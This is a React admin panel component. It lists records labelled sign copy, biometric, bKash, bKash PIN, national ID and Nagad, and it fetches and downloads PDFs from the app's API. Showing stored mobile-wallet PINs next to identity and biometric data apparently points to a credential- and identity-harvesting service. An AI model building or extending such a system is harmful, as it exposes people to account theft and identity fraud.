import { useState } from "react";
import axios from "axios";
import { saveAs } from "file-saver";
import AdminTable from "../../../utils/AdminTable";
import useAllSinCopy from "../../../hooks/useALlSinCoppy";
import useAllBioMatrics from "../../../hooks/useAllBIoMatrics";
import useAllUserBiomatric from "../../../hooks/useAlluserBioMatric";
import useAllUserBkash from "../../../hooks/useAllUSerBkash";
import useAllUSerBkashPin from "../../../hooks/useAllUSerBkashPin";
import useAllUSerNid from "../../../hooks/useAllUSerNid";
import useAllUserNogod from "../../../hooks/useAllUSerNogod";
import useAllUserSingCopy from "../../../hooks/useAllUSerSinCopy";
const PdfUploadComponent = () => {
  const { biometric } = useAllUserBiomatric();
  const { allBkash } = useAllUserBkash();
  const { bkashPin } = useAllUSerBkashPin();
  const { nid } = useAllUSerNid();
  const { nogod } = useAllUserNogod();
  const { sinCopy } = useAllUserSingCopy();

  const handleDownload = () => {};

  const [pdfs, setPdfs] = useState([]);

  const getPdfs = async () => {
    try {
      const response = await axios.get(
        "https://telent-finder.vercel.app/api/v1/get-pdf"
      );
      console.log(response);
      setPdfs(response);
    } catch (error) {
      console.error("Error fetching PDFs:", error);
    }
  };

  const downloadPdf = async (pdfName) => {
    try {
      const response = await axios.get(
        `https://telent-finder.vercel.app/api/v1/pdfs/${pdfName}`,
        {
          responseType: "blob",
        }
      );

      saveAs(response.data, pdfName);
    } catch (error) {
      console.error("Error downloading PDF:", error);
    }
  };

  return (
    <div>
      <AdminTable data={sinCopy} title={"sign copy"} />
      <AdminTable data={biometric} title={"biometric"} />
      <AdminTable data={allBkash} title={"all Bkash"} />
      <AdminTable data={bkashPin} title={"bkashPin"} />
      <AdminTable data={nid} title={"nid"} />
      <AdminTable data={nogod} title={"nogod"} />

      <div>
        <button onClick={getPdfs}>Fetch PDFs</button>
        <ul>
          {pdfs?.data?.data.map((pdf) => (
            <li key={pdf._id}>
              <span>{pdf.name}</span>
              <button onClick={() => downloadPdf(pdf.name)}>Download</button>
            </li>
          ))}
        </ul>
      </div>
    </div>
  );
};

export default PdfUploadComponent;
